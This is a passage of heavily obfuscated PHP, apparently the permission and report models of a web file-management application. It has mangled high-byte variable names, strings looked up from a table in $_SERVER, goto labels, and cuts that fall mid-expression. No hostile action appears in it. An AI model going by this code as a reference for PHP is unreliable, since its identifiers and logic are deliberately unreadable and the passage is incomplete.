array($Â¢ùÚúö[682] => $ı¥Ù“»Ñ[$Â¢ùÚúö[682]], $Â¢ùÚúö[1677] => $ı¥Ù“»Ñ[$Â¢ùÚúö[1677]], $Â¢ùÚúö[194] => $ı¥Ù“»Ñ[$Â¢ùÚúö[194]], $Â¢ùÚúö[555] => $ı¥Ù“»Ñ[$Â¢ùÚúö[555]], $Â¢ùÚúö[1791] => USER_ID, $Â¢ùÚúö[33] => $ı¥Ù“»Ñ[$Â¢ùÚúö[33]], $Â¢ùÚúö[538] => $ı¥Ù“»Ñ[$Â¢ùÚúö[538]]); return Model($Â¢ùÚúö[2169])->add($†–…í¤); } public function reportList($® Ö¢®¾) { $•¤§Â¿Í =& $_SERVER[‹‰”››ê]; $ğŠîå— = array(); if ($® Ö¢®¾[$•¤§Â¿Í[850]]) { $¹ÁÑˆÜŠ = $® Ö¢®¾[$•¤§Â¿Í[851]] ? $® Ö¢®¾[$•¤§Â¿Í[851]] : strtotime(date($•¤§Â¿Í[2171])); $ğŠîå—[$•¤§Â¿Í[234]] = array($•¤§Â¿Í[420], array($® Ö¢®¾[$•¤§Â¿Í[850]], $¹ÁÑˆÜŠ)); } if (isset($® Ö¢®¾[$•¤§Â¿Í[33]]) && in_array($® Ö¢®¾[$•¤§Â¿Í[33]], array($•¤§Â¿Í[91], $•¤§Â¿Í[522], $•¤§Â¿Í[2174], $•¤§Â¿Í[2175], $•¤§Â¿Í[2176]))) { $ğŠîå—[$•¤§Â¿Í[33]] = $® Ö¢®¾[$•¤§Â¿Í[33]]; } if (isset($® Ö¢®¾[$•¤§Â¿Í[840]]) && in_array($® Ö¢®¾[$•¤§Â¿Í[840]], array($•¤§Â¿Í[231], $•¤§Â¿Í[91], $•¤§Â¿Í[522], $•¤§Â¿Í[2174]))) { $ğŠîå—[$•¤§Â¿Í[840]] = $® Ö¢®¾[$•¤§Â¿Í[840]]; } $Å£¢İÊ“ = Input::get($•¤§Â¿Í[543], $•¤§Â¿Í[7], $•¤§Â¿Í[2173], array($•¤§Â¿Í[2087], $•¤§Â¿Í[537])); $ÈÁÆêË = array($•¤§Â¿Í[535] => $•¤§Â¿Í[536], $•¤§Â¿Í[537] => $•¤§Â¿Í[538]); $ùÏè†Îú = $•¤§Â¿Í[2177] . $ÈÁÆêË[$Å£¢İÊ“]; $Ì£ìÔ­¯ = Model($•¤§Â¿Í[2169])->where($ğŠîå—)->order($ùÏè†Îú)->selectPage(20); if (empty($Ì£ìÔ­¯[$•¤§Â¿Í[457]])) { return array(); } $®’ãü = array_to_keyvalue_group($Ì£ìÔ­¯[$•¤§Â¿Í[457]], $•¤§Â¿Í[840], $•¤§Â¿Í[682]); if (!empty($®’ãü[0])) { $® Ö¢®¾ = $®’ãü[0]; $ğŠîå— = array($•¤§Â¿Í[682] => array($•¤§Â¿Í[7], $® Ö¢®¾)); $¶ºışûˆ = $this->where($ğŠîå—)->field($•¤§Â¿Í[682])->select(); $¶ºışûˆ = array_to_keyvalue($¶ºışûˆ, $•¤§Â¿Í[12], $•¤§Â¿Í[682]); $¥«‡òü = array_diff($® Ö¢®¾, $¶ºışûˆ); if (!empty($¥«‡òü)) { foreach ($Ì£ìÔ­¯[$•¤§Â¿Í[457]] as $³‡³™ñŠ => $ñéù©¯Á) { if (in_array($ñéù©¯Á[$•¤§Â¿Í[682]], $¥«‡òü)) { unset($Ì£ìÔ­¯[$•¤§Â¿Í[457]][$³‡³™ñŠ]); } } } } $this->_listDataApply($Ì£ìÔ­¯[$•¤§Â¿Í[457]]); return $Ì£ìÔ­¯; } public function reportStatus($½¶ÃÊçœ) { $˜„ë×àŞ =& $_SERVER[‹‰”››ê]; $½†õŞ¤ï = array($˜„ë×àŞ[487] => $½¶ÃÊçœ[$˜„ë×àŞ[487]]); $æ–Ù·Ê = Model($˜„ë×àŞ[2169])->where($½†õŞ¤ï)->field($˜„ë×àŞ[2178])->find(); if (!$æ–Ù·Ê) { return !1; } $‰‡µàÚÇ = array($˜„ë×àŞ[840] => $½¶ÃÊçœ[$˜„ë×àŞ[840]]); if ($½¶ÃÊçœ[$˜„ë×àŞ[840]] == $˜„ë×àŞ[2174] && $æ–Ù·Ê[$˜„ë×àŞ[840]] == $˜„ë×àŞ[2174]) { $‰‡µàÚÇ[$˜„ë×àŞ[840]] = 0; } $Áš’Ğ‘“ = Model($˜„ë×àŞ[2169])->where($½†õŞ¤ï)->save($‰‡µàÚÇ); if ($½¶ÃÊçœ[$˜„ë×àŞ[840]] == $˜„ë×àŞ[522]) { if ($æ–Ù·Ê[$˜„ë×àŞ[555]] != $˜„ë×àŞ[231] && $this->shareFileMeta($æ–Ù·Ê[$˜„ë×àŞ[555]])) { $this->shareFileMeta($æ–Ù·Ê[$˜„ë×àŞ[555]], 0); } $this->remove($æ–Ù·Ê[$˜„ë×àŞ[682]]); return !0; } if ($Áš’Ğ‘“ && $½¶ÃÊçœ[$˜„ë×àŞ[840]] == $˜„ë×àŞ[2174]) { $êÜ÷ˆÀ² = $‰‡µàÚÇ[$˜„ë×àŞ[840]] == $˜„ë×àŞ[2174] ? 1 : 0; $this->shareFileMeta($æ–Ù·Ê[$˜„ë×àŞ[555]], $êÜ÷ˆÀ²); $this->removeByFile($æ–Ù·Ê[$˜„ë×àŞ[555]]); } return $Áš’Ğ‘“; } private function removeByFile($ÆÛ‡íÌ÷) { $ßÚØ¢À¶ =& $_SERVER[‹‰”››ê]; $ˆÚÔüÕ = Model($ßÚØ¢À¶[920])->where(array($ßÚØ¢À¶[555] => $ÆÛ‡íÌ÷))->field($ßÚØ¢À¶[194])->select(); $¼†àèßé = array_to_keyvalue($ˆÚÔüÕ, $ßÚØ¢À¶[12], $ßÚØ¢À¶[194]); $ş¡Û€êÑ = array($ßÚØ¢À¶[194] => array($ßÚØ¢À¶[7], $¼†àèßé), $ßÚØ¢À¶[576] => 1); $ˆÚÔüÕ = $this->where($ş¡Û€êÑ)->field($ßÚØ¢À¶[682])->select(); if (empty($ˆÚÔüÕ)) { return; } $äŸÃşêÓ = array_to_keyvalue($ˆÚÔüÕ, $ßÚØ¢À¶[12], $ßÚØ¢À¶[682]); $this->remove($äŸÃşêÓ); } private function shareFileMeta($ÉŠ´œ˜¶, $÷¶¡ŠÆ£ = null) { $ûÎôÚæ‰ =& $_SERVER[‹‰”››ê]; $¬·İâò» = array($ûÎôÚæ‰[555] => $ÉŠ´œ˜¶, $ûÎôÚæ‰[97] => $ûÎôÚæ‰[2179]); if (is_null($÷¶¡ŠÆ£)) { return Model($ûÎôÚæ‰[2180])->where($¬·İâò»)->find(); } $¬·İâò»[$ûÎôÚæ‰[462]] = $÷¶¡ŠÆ£; Model($ûÎôÚæ‰[2180])->add($¬·İâò», array(), !0); } } goto A³‚«®±í; b˜¹–Äã¼: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\143\x65\137\x61\165\x74\x68"; public function getAuth($ˆœÉß) { $Àû¶´¼é =& $_SERVER[‹‰”››ê]; $î˜ª¿¬¯ = $this->sourceAuthSelect($ˆœÉß); $êÌà‘Çƒ = array(); $±»ğ·‡¨ = array(); $„‰†áÇ‰ = 2 << 25; foreach ($î˜ª¿¬¯ as $Ï¢éĞ¨ö) { $éÏ¬™ = Model($Àû¶´¼é[585])->listData($Ï¢éĞ¨ö[$Àû¶´¼é[2100]]); if (!$éÏ¬™) { continue; } $êÌà‘Çƒ[] = $Ï¢éĞ¨ö; $òØÑúœ² = 0; if ($Ï¢éĞ¨ö[$Àû¶´¼é[191]] == SourceModel::TYPE_GROUP) { $òØÑúœ² = $„‰†áÇ‰ * 2; } if ($Ï¢éĞ¨ö[$Àû¶´¼é[191]] == SourceModel::TYPE_USER) { $òØÑúœ² = $„‰†áÇ‰; } if ($Ï¢éĞ¨ö[$Àû¶´¼é[191]] == SourceModel::TYPE_USER && $Ï¢éĞ¨ö[$Àû¶´¼é[583]] == $Àû¶´¼é[231]) { $òØÑúœ² = 0; } $±»ğ·‡¨[] = $éÏ¬™[$Àû¶´¼é[499]] + $òØÑúœ²; } array_multisort($±»ğ·‡¨, SORT_DESC, $êÌà‘Çƒ); return $êÌà‘Çƒ; } public function sourceAuthSelect($ßí·”Æğ) { $÷€»Ã¶Â =& $_SERVER[‹‰”››ê]; static $ßíÄ¤ÙÀ = array(); $ïÎÎùá¥ = is_array($ßí·”Æğ) ? !1 : !0; if ($ïÎÎùá¥) { $ßí·”Æğ = array($ßí·”Æğ); } $à†üç¸í = array(); foreach ($ßí·”Æğ as $¨˜•ïÀ) { if (isset($ßíÄ¤ÙÀ[$¨˜•ïÀ])) { $à†üç¸í[$¨˜•ïÀ] = $ßíÄ¤ÙÀ[$¨˜•ïÀ]; } } if (count($à†üç¸í) == count($ßí·”Æğ)) { return $ïÎÎùá¥ ? $à†üç¸í[$ßí·”Æğ[0]] : $à†üç¸í; } $şÆ‘¬Ù¤ = $÷€»Ã¶Â[2181]; $·²³Øâ = array($÷€»Ã¶Â[194] => array($÷€»Ã¶Â[7], $ßí·”Æğ)); $Âò¸Ê“ƒ = $this->field($şÆ‘¬Ù¤)->order($÷€»Ã¶Â[487])->where($·²³Øâ)->select(); $ı—”ŸÙ¼ = array_to_keyvalue_group($Âò¸Ê“ƒ, $÷€»Ã¶Â[194]); foreach ($ßí·”Æğ as $¨˜•ïÀ) { $ßíÄ¤ÙÀ[$¨˜•ïÀ] = $ı—”ŸÙ¼[$¨˜•ïÀ] ? $ı—”ŸÙ¼[$¨˜•ïÀ] : array(); } if ($ïÎÎùá¥) { return $Âò¸Ê“ƒ; } return $ı—”ŸÙ¼; } public function setAuth($’ıİÌ¤, $À¬äŒá) { $ù«Ëİ—è =& $_SERVER[‹‰”››ê]; $ôººŒí  = Model($ù«Ëİ—è[1437])->sourceInfo($’ıİÌ¤); if (!$ôººŒí ) { return !1; } if ($ôººŒí [$ù«Ëİ—è[191]] != SourceModel::TYPE_GROUP) { return !1; } $Ù¬éê¨ = 1; $¾Îæ›İ× = $ôººŒí [$ù«Ëİ—è[583]]; if ($¾Îæ›İ× != $Ù¬éê¨) { $åïŸ¿î› = array($ù«Ëİ—è[1992] => $¾Îæ›İ×); $Ê’ĞÉøÎ = Model($ù«Ëİ—è[2086])->field($ù«Ëİ—è[1791])->where($åïŸ¿î›)->select(); $Ê’ĞÉøÎ = array_to_keyvalue($Ê’ĞÉøÎ, $ù«Ëİ—è[12], $ù«Ëİ—è[1791]); } $ŠâîÄÆ› = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ƒ¦ñŞœ‘ = array(); foreach ($À¬äŒá as $¥Çê“ÃÖ) { if (!in_array($¥Çê“ÃÖ[$ù«Ëİ—è[191]], $ŠâîÄÆ›)) { show_json(LNG($ù«Ëİ—è[2182]), !1); } if ($¾Îæ›İ× != $Ù¬éê¨) { if ($¥Çê“ÃÖ[$ù«Ëİ—è[191]] == SourceModel::TYPE_GROUP) { } if ($¥Çê“ÃÖ[$ù«Ëİ—è[583]] != 0 && !in_array($¥Çê“ÃÖ[$ù«Ëİ—è[583]], $Ê’ĞÉøÎ)) { } } if ($¥Çê“ÃÖ[$ù«Ëİ—è[583]] == 0) { $¥Çê“ÃÖ[$ù«Ëİ—è[191]] = SourceModel::TYPE_USER; } $ƒ¦ñŞœ‘[] = array($ù«Ëİ—è[194] => $’ıİÌ¤, $ù«Ëİ—è[191] => intval($¥Çê“ÃÖ[$ù«Ëİ—è[191]]), $ù«Ëİ—è[583] => intval($¥Çê“ÃÖ[$ù«Ëİ—è[583]]), $ù«Ëİ—è[2100] => intval($¥Çê“ÃÖ[$ù«Ëİ—è[2100]]) ? intval($¥Çê“ÃÖ[$ù«Ëİ—è[2100]]) : 0, $ù«Ëİ—è[2164] => intval($¥Çê“ÃÖ[$ù«Ëİ—è[2164]]) ? intval($¥Çê“ÃÖ[$ù«Ëİ—è[2164]]) : -1); } $this->where(array($ù«Ëİ—è[503] => $’ıİÌ¤))->delete(); $this->addAll($ƒ¦ñŞœ‘); return !0; } public function authClear($Ë‹Öµ°Ã) { $Ğé·İ¿ï =& $_SERVER[‹‰”››ê]; $€óëÄ¾ = Model($Ğé·İ¿ï[1437])->sourceInfo($Ë‹Öµ°Ã); $ÖÛèÇûÕ = array($Ë‹Öµ°Ã); if ($€óëÄ¾[$Ğé·İ¿ï[497]] == $Ğé·İ¿ï[91]) { $”ßıÔ”é = array($Ğé·İ¿ï[669] => array($Ğé·İ¿ï[629], $€óëÄ¾[$Ğé·İ¿ï[598]] . $Ë‹Öµ°Ã . $Ğé·İ¿ï[630])); $ÖÛèÇûÕ = Model($Ğé·İ¿ï[1437])->field($Ğé·İ¿ï[503])->where($”ßıÔ”é)->getField($Ğé·İ¿ï[194], !0); $ÖÛèÇûÕ[] = $Ë‹Öµ°Ã; } $this->where(array($Ğé·İ¿ï[503] => array($Ğé·İ¿ï[504], $ÖÛèÇûÕ)))->delete(); return !0; } public function getAllChildren($²ÕëâŒ) { $Ø³Ã¡Ãá =& $_SERVER[‹‰”››ê]; $³¥ÁÈ… = Model($Ø³Ã¡Ãá[1437])->sourceInfo($²ÕëâŒ); if ($³¥ÁÈ…[$Ø³Ã¡Ãá[497]] != $Ø³Ã¡Ãá[91]) { return $this->sourceListAuth(array($²ÕëâŒ)); } if ($³¥ÁÈ…[$Ø³Ã¡Ãá[191]] != SourceModel::TYPE_GROUP) { return array(); } $ğé§§“³ = 1; $»ğ™ˆ¤ = array($²ÕëâŒ); if ($³¥ÁÈ…[$Ø³Ã¡Ãá[193]] == $Ø³Ã¡Ãá[231] && $³¥ÁÈ…[$Ø³Ã¡Ãá[583]] != $ğé§§“³) { $»ğ™ˆ¤ = $this->groupChidldAllRootSource($³¥ÁÈ…[$Ø³Ã¡Ãá[583]]); } $‘ù”÷»õ = $this->field($Ø³Ã¡Ãá[194])->group($Ø³Ã¡Ãá[194])->select(); $‘ù”÷»õ = array_to_keyvalue($‘ù”÷»õ, $Ø³Ã¡Ãá[12], $Ø³Ã¡Ãá[194]); if (!$‘ù”÷»õ) { return array(); } $ÈÀŠ’×¬ = $Ø³Ã¡Ãá[2183]; $åõ¥ıø› = array($Ø³Ã¡Ãá[194] => array($Ø³Ã¡Ãá[7], $‘ù”÷»õ), $Ø³Ã¡Ãá[517] => $Ø³Ã¡Ãá[231]); $“ĞÔÛÅş = Model($Ø³Ã¡Ãá[920])->field($ÈÀŠ’×¬)->where($åõ¥ıø›)->select(); $Û‹ÆÏ£” = array($²ÕëâŒ); foreach ($“ĞÔÛÅş as $ñÁÛ–íš) { foreach ($»ğ™ˆ¤ as $ÕíôáÅÙ) { $’µÄ¤ÊÙ = $Ø³Ã¡Ãá[50] . $ÕíôáÅÙ . $Ø³Ã¡Ãá[50]; $‹·Éµğ = $ñÁÛ–íš[$Ø³Ã¡Ãá[598]] . $ñÁÛ–íš[$Ø³Ã¡Ãá[194]] . $Ø³Ã¡Ãá[50]; if (strstr($‹·Éµğ, $’µÄ¤ÊÙ)) { $Û‹ÆÏ£”[] = $ñÁÛ–íš[$Ø³Ã¡Ãá[194]]; break; } } } return $this->sourceListAuth($Û‹ÆÏ£”); } private function sourceListAuth($ıÆ…õÎŠ) { $§Ç”Óö =& $_SERVER[‹‰”››ê]; $ÜÈ®ŞÎ = Model($§Ç”Óö[1437])->sourceListInfo($ıÆ…õÎŠ, !0); $éôÙ”Ùú = $this->sourceAuthSelect($ıÆ…õÎŠ); $í÷ßˆ‚ = array(); $‰ÚÏ¬¾ = array(); foreach ($ÜÈ®ŞÎ as $ÓğÁ¹”) { unset($ÓğÁ¹”[$§Ç”Óö[541]]); unset($ÓğÁ¹”[$§Ç”Óö[539]]); unset($ÓğÁ¹”[$§Ç”Óö[499]]); unset($ÓğÁ¹”[$§Ç”Óö[90]]); $Ó¶õû«° = $éôÙ”Ùú[$ÓğÁ¹”[$§Ç”Óö[194]]]; if (!$Ó¶õû«°) { continue; } $ÓğÁ¹”[$§Ç”Óö[2184]] = $this->authTargetInfo($Ó¶õû«°); $ÓğÁ¹”[$§Ç”Óö[596]] = rtrim($ÓğÁ¹”[$§Ç”Óö[602]], $§Ç”Óö[8]) . $§Ç”Óö[8] . ltrim($ÓğÁ¹”[$§Ç”Óö[596]], $§Ç”Óö[8]); $í÷ßˆ‚[] = $ÓğÁ¹”; $Ğå‹¦—  = count(explode($§Ç”Óö[8], trim($ÓğÁ¹”[$§Ç”Óö[596]], $§Ç”Óö[8]))); $‰ÚÏ¬¾[] = $Ğå‹¦—  + ($ÓğÁ¹”[$§Ç”Óö[33]] == $§Ç”Óö[78] ? 0 : 1000); } array_multisort($‰ÚÏ¬¾, SORT_ASC, $í÷ßˆ‚); return $í÷ßˆ‚; } private function groupChidldAllRootSource($Äõ£İç) { $à‰ÜÛğº =& $_SERVER[‹‰”››ê]; $‰ğˆ­ö  = Model($à‰ÜÛğº[2185])->groupChildrenAll($Äõ£İç); $òãÔ°óÇ = array($à‰ÜÛğº[193] => 0, $à‰ÜÛğº[583] => array($à‰ÜÛğº[7], $‰ğˆ­ö ), $à‰ÜÛğº[191] => SourceModel::TYPE_GROUP); $ì•à½ê = Model($à‰ÜÛğº[920])->field($à‰ÜÛğº[194])->where($òãÔ°óÇ)->select(); $ì•à½ê = array_to_keyvalue($ì•à½ê, $à‰ÜÛğº[12], $à‰ÜÛğº[194]); return $ì•à½ê; } private function authTargetInfo($˜Ú¸ïÕÀ) { $¨ˆ¬¬çé =& $_SERVER[‹‰”››ê]; $ÂÑÕ«Ïß = array(); $ô”û›»Ø = array(); $½ïÅ¡© = 2 << 25; foreach ($˜Ú¸ïÕÀ as $üÎ®µŸõ) { $è»¡­”ş = Model($¨ˆ¬¬çé[585])->listData($üÎ®µŸõ[$¨ˆ¬¬çé[2100]]); if (!$è»¡­”ş) { continue; } if ($üÎ®µŸõ[$¨ˆ¬¬çé[191]] == SourceModel::TYPE_USER) { $— óâú = Model($¨ˆ¬¬çé[591])->getInfoSimpleOuter($üÎ®µŸõ[$¨ˆ¬¬çé[583]]); if ($— óâú[$¨ˆ¬¬çé[1791]] == $¨ˆ¬¬çé[1289]) { continue; } if ($— óâú[$¨ˆ¬¬çé[1791]] == $¨ˆ¬¬çé[231]) { $— óâú[$¨ˆ¬¬çé[32]] = LNG($¨ˆ¬¬çé[2186]); } } else { $— óâú = Model($¨ˆ¬¬çé[599])->getInfoSimple($üÎ®µŸõ[$¨ˆ¬¬çé[583]]); } if (!$— óâú) { continue; } $— óâú[$¨ˆ¬¬çé[554]] = $è»¡­”ş; $ÂÑÕ«Ïß[] = $— óâú; $ğ½Öîêì = 0; if ($üÎ®µŸõ[$¨ˆ¬¬çé[191]] == SourceModel::TYPE_GROUP) { $ğ½Öîêì = $½ïÅ¡© * 2; } if ($üÎ®µŸõ[$¨ˆ¬¬çé[191]] == SourceModel::TYPE_USER) { $ğ½Öîêì = $½ïÅ¡©; } if ($üÎ®µŸõ[$¨ˆ¬¬çé[191]] == SourceModel::TYPE_USER && $üÎ®µŸõ[$¨ˆ¬¬çé[583]] == $¨ˆ¬¬çé[231]) { $ğ½Öîêì = 0; } $ô”û›»Ø[] = $è»¡­”ş[$¨ˆ¬¬çé[499]] + $ğ½Öîêì; } array_multisort($ô”û›»Ø, SORT_DESC, $ÂÑÕ«Ïß); return $ÂÑÕ«Ïß; } public function getAllChildrenByUser($¹³²¶ŞÎ, $ñÎ„ê­î) { $•–åİğ =& $_SERVER[‹‰”››ê]; $Ã¾™…È = Model($•–åİğ[611])->getInfo($ñÎ„ê­î); if (!$ñÎ„ê­î || !$¹³²¶ŞÎ || !$Ã¾™…È) { return array(); } $é§ºıÁÑ = Model($•–åİğ[1437])->sourceInfo($¹³²¶ŞÎ); $Ã æÆ€ = array(); $Ø¿ó´Œå = 1; if ($é§ºıÁÑ[$•–åİğ[193]] == $•–åİğ[231] && $é§ºıÁÑ[$•–åİğ[583]] != $Ø¿ó´Œå && $this->groupContainUser($é§ºıÁÑ[$•–åİğ[583]], $ñÎ„ê­î)) { foreach ($Ã¾™…È[$•–åİğ[2187]] as $âèµŠõ‹) { $»ˆ±ì¶° = Model($•–åİğ[599])->getInfo($âèµŠõ‹[$•–åİğ[1992]]); $¹¦¬œ½ = Model($•–åİğ[611])->getInfoSimpleOuter($ñÎ„ê­î); $¹¦¬œ½[$•–åİğ[554]] = $âèµŠõ‹[$•–åİğ[499]]; if (Model($•–åİğ[585])->authCheckAction($âèµŠõ‹[$•–åİğ[499]][$•–åİğ[499]], $•–åİğ[2013])) { continue; } $ÂÖ¹½ö‚ = array($•–åİğ[32] => $•–åİğ[1309] . $»ˆ±ì¶°[$•–åİğ[32]], $•–åİğ[194] => $»ˆ±ì¶°[$•–åİğ[90]][$•–åİğ[194]], $•–åİğ[87] => KodIO::make($»ˆ±ì¶°[$•–åİğ[90]][$•–åİğ[194]]), $•–åİğ[193] => $•–åİğ[231], $•–åİğ[191] => $•–åİğ[592], $•–åİğ[33] => $•–åİğ[633], $•–åİğ[596] => $»ˆ±ì¶°[$•–åİğ[603]], $•–åİğ[1992] => $»ˆ±ì¶°[$•–åİğ[1992]], $•–åİğ[600] => $»ˆ±ì¶°[$•–åİğ[193]], $•–åİğ[2184] => array($¹¦¬œ½)); $Ã æÆ€[$ÂÖ¹½ö‚[$•–åİğ[194]]] = $ÂÖ¹½ö‚; } } $İæÇşÑæ = array(); $ËÒ¿æå† = $this->getAllChildren($¹³²¶ŞÎ); foreach ($ËÒ¿æå† as $ıĞÔåá) { $õñıá™… = !1; foreach ($ıĞÔåá[$•–åİğ[2184]] as $­æ“½É³) { if ($­æ“½É³[$•–åİğ[1791]]) { if ($­æ“½É³[$•–åİğ[1791]] == $ñÎ„ê­î) { $õñıá™… = !0; break; } } if ($­æ“½É³[$•–åİğ[1992]]) { if ($this->groupContainUser($­æ“½É³[$•–åİğ[1992]], $ñÎ„ê­î)) { $õñıá™… = !0; break; } } } if ($õñıá™…) { $İæÇşÑæ[] = $ıĞÔåá; } $ç…·û½» = $ıĞÔåá[$•–åİğ[194]]; if (isset($Ã æÆ€[$ç…·û½»])) { $ıĞÔåá[$•–åİğ[2184]][] = $Ã æÆ€[$ç…·û½»][0]; $Ã æÆ€[$ç…·û½»] = !1; } } $Ã æÆ€ = array_filter(array_values($Ã æÆ€)); $İæÇşÑæ = array_merge($Ã æÆ€, $İæÇşÑæ); return $İæÇşÑæ; } public function setAllChildrenByUser($ªÕ´ãñ´, $ª¨ÖËûí, $÷õ›¿‚Ù) { $íŠºŞ¬” =& $_SERVER[‹‰”››ê]; $ûØÛ¬˜í = $this->getAllChildrenByUser($ªÕ´ãñ´, $ª¨ÖËûí); if (!$÷õ›¿‚Ù || !$ûØÛ¬˜í) { return !1; } foreach ($ûØÛ¬˜í as $„ëÄÕÊ¤) { $«ôºøŠ± = array(); foreach ($„ëÄÕÊ¤[$íŠºŞ¬”[2184]] as $‡äüèÆ) { $û¿ßÇºÂ = $‡äüèÆ[$íŠºŞ¬”[554]]; $´ÆüÕøÓ = $‡äüèÆ[$íŠºŞ¬”[1791]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $îĞÇºıˆ = $‡äüèÆ[$íŠºŞ¬”[1791]] ? $‡äüèÆ[$íŠºŞ¬”[1791]] : $‡äüèÆ[$íŠºŞ¬”[1992]]; if ($‡äüèÆ[$íŠºŞ¬”[1791]] && $‡äüèÆ[$íŠºŞ¬”[1791]] == $ª¨ÖËûí) { continue; } $«ôºøŠ±[] = array($íŠºŞ¬”[194] => $„ëÄÕÊ¤[$íŠºŞ¬”[194]], $íŠºŞ¬”[191] => $´ÆüÕøÓ, $íŠºŞ¬”[583] => intval($îĞÇºıˆ), $íŠºŞ¬”[2100] => isset($û¿ßÇºÂ[$íŠºŞ¬”[487]]) ? intval($û¿ßÇºÂ[$íŠºŞ¬”[487]]) : 0, $íŠºŞ¬”[2164] => isset($û¿ßÇºÂ[$íŠºŞ¬”[2164]]) ? intval($û¿ßÇºÂ[$íŠºŞ¬”[2164]]) : -1); } $«ôºøŠ±[] = array($íŠºŞ¬”[194] => $„ëÄÕÊ¤[$íŠºŞ¬”[194]], $íŠºŞ¬”[191] => SourceModel::TYPE_USER, $íŠºŞ¬”[583] => intval($ª¨ÖËûí), $íŠºŞ¬”[2100] => intval($÷õ›¿‚Ù), $íŠºŞ¬”[2164] => -1); $this->where(array($íŠºŞ¬”[503] => $„ëÄÕÊ¤[$íŠºŞ¬”[194]]))->delete(); $this->addAll($«ôºøŠ±); } return !0; } public function get($­ığËûÎ) { $şØÂ®ù¾ = $this->getSourceList(array($­ığËûÎ), !0); return $şØÂ®ù¾[0]; } public function getSourceList($±àœîÂñ, $åÈŞÌşÊ = false, $‚˜ÉÂ»Ì = false) { $°¹ï£‰Ä =& $_SERVER[‹‰”››ê]; if (!$±àœîÂñ) { return array(); } $±¸œ£àÒ = Model($°¹ï£‰Ä[1437]); if (!$åÈŞÌşÊ && count($±àœîÂñ) == 1) { $åÈŞÌşÊ = array(); $åÈŞÌşÊ[$±àœîÂñ[0]] = $±¸œ£àÒ->sourceInfo($±àœîÂñ[0]); } if (!$åÈŞÌşÊ) { $ ÊáÁÌ˜ = array($°¹ï£‰Ä[503] => array($°¹ï£‰Ä[504], $±àœîÂñ)); $åÈŞÌşÊ = $±¸œ£àÒ->field($°¹ï£‰Ä[2188])->where($ ÊáÁÌ˜)->select(); $åÈŞÌşÊ = array_to_keyvalue($åÈŞÌşÊ, $°¹ï£‰Ä[194]); } $İÔµ¨Éı = $±àœîÂñ; foreach ($åÈŞÌşÊ as $¿çµ¦‘­ => $†Âş¼Úü) { $†´£©ˆö = $±¸œ£àÒ->parentLevelArray($†Âş¼Úü[$°¹ï£‰Ä[598]]); $İÔµ¨Éı = array_merge($İÔµ¨Éı, array($¿çµ¦‘­), array_reverse($†´£©ˆö)); } $İÔµ¨Éı = array_values(array_unique($İÔµ¨Éı)); if (!$İÔµ¨Éı) { return array(); } $Äªî†ƒ¶ = $this->sourceAuthSelect($İÔµ¨Éı); $×ª’Ï ‘ = array(); foreach ($İÔµ¨Éı as $™ÈÔ¹ÔÔ) { if (isset($Äªî†ƒ¶[$™ÈÔ¹ÔÔ])) { $×ª’Ï ‘[$™ÈÔ¹ÔÔ] = $Äªî†ƒ¶[$™ÈÔ¹ÔÔ]; } } $Æµ×ÎÀë = $this->userIsRoot($‚˜ÉÂ»Ì); $´ë‘†º« = AuthModel::authAll(); $‡’÷ÆÏ = array($°¹ï£‰Ä[500] => $´ë‘†º«, $°¹ï£‰Ä[2189] => array($°¹ï£‰Ä[505] => 0, $°¹ï£‰Ä[1998] => $´ë‘†º«, $°¹ï£‰Ä[506] => LNG($°¹ï£‰Ä[2190]), $°¹ï£‰Ä[2015] => $°¹ï£‰Ä[2191])); $¹‡¦Ãìš = array(); foreach ($åÈŞÌşÊ as $™ÈÔ¹ÔÔ => $Š¨Õşî¹) { if ($Æµ×ÎÀë && $GLOBALS[$°¹ï£‰Ä[6]][$°¹ï£‰Ä[2011]]) { $¹‡¦Ãìš[$™ÈÔ¹ÔÔ] = $‡’÷ÆÏ; continue; } $¹‡¦Ãìš[$™ÈÔ¹ÔÔ] = $this->makeSourceAuth($Š¨Õşî¹, $×ª’Ï ‘, $‚˜ÉÂ»Ì); } return $¹‡¦Ãìš; } public function authDeepCheck($şá¨‹šñ, $œÍœ™ò› = false) { $ûÖÚ•Úª =& $_SERVER[‹‰”››ê]; $œÍœ™ò› = $œÍœ™ò› ? $œÍœ™ò› : USER_ID; $êÙÄéÂ = $this->makeAuthDeep($œÍœ™ò›); if (!in_array($şá¨‹šñ, $êÙÄéÂ[$ûÖÚ•Úª[2192]])) { return !1; } $ÚáûÅÍ = array(); foreach ($êÙÄéÂ[$ûÖÚ•Úª[2193]] as $»œşÙ¸ => $²À¼¡Æ•) { if (!in_array($şá¨‹šñ, $²À¼¡Æ•)) { continue; } $ÚáûÅÍ[] = $»œşÙ¸; } if (!$ÚáûÅÍ) { return !1; } $éİ»Ğù = $ÚáûÅÍ ? $ÚáûÅÍ[0] : $şá¨‹šñ; return array($ûÖÚ•Úª[500] => -1, $ûÖÚ•Úª[554] => array($ûÖÚ•Úª[505] => $ûÖÚ•Úª[1289], $ûÖÚ•Úª[1998] => $ûÖÚ•Úª[231], $ûÖÚ•Úª[506] => LNG($ûÖÚ•Úª[2194]), $ûÖÚ•Úª[2015] => $ûÖÚ•Úª[2195]), $ûÖÚ•Úª[2196] => LNG($ûÖÚ•Úª[2197]), $ûÖÚ•Úª[2198] => $this->sourceAuthInfo($éİ»Ğù)); } protected function makeAuthDeep($Óßáë®õ = false) { $¢Â™œ¿¬ =& $_SERVER[‹‰”››ê]; static $½…à‰„ = array(); $Óßáë®õ = $Óßáë®õ ? $Óßáë®õ : USER_ID; if (isset($½…à‰„[$Óßáë®õ])) { return $½…à‰„[$Óßáë®õ]; } $ºÀ¸şíË = Model($¢Â™œ¿¬[2199])->listData(); $ÊÏ€Ì‹ú = array(); foreach ($ºÀ¸şíË as $×²üÕ™®) { if ($×²üÕ™®[$¢Â™œ¿¬[499]] == 0 && $×²üÕ™®[$¢Â™œ¿¬[2014]] == $¢Â™œ¿¬[91]) { $ÊÏ€Ì‹ú[] = $×²üÕ™®[$¢Â™œ¿¬[487]]; } } $˜¶©ºâ® = $this->userGroupParents($Óßáë®õ); $çÒ‘¼ÑÎ = array($¢Â™œ¿¬[191] => SourceModel::TYPE_USER, $¢Â™œ¿¬[583] => $Óßáë®õ); if ($˜¶©ºâ®) { $çÒ‘¼ÑÎ = array(array($¢Â™œ¿¬[191] => SourceModel::TYPE_USER, $¢Â™œ¿¬[583] => $Óßáë®õ), array($¢Â™œ¿¬[191] => 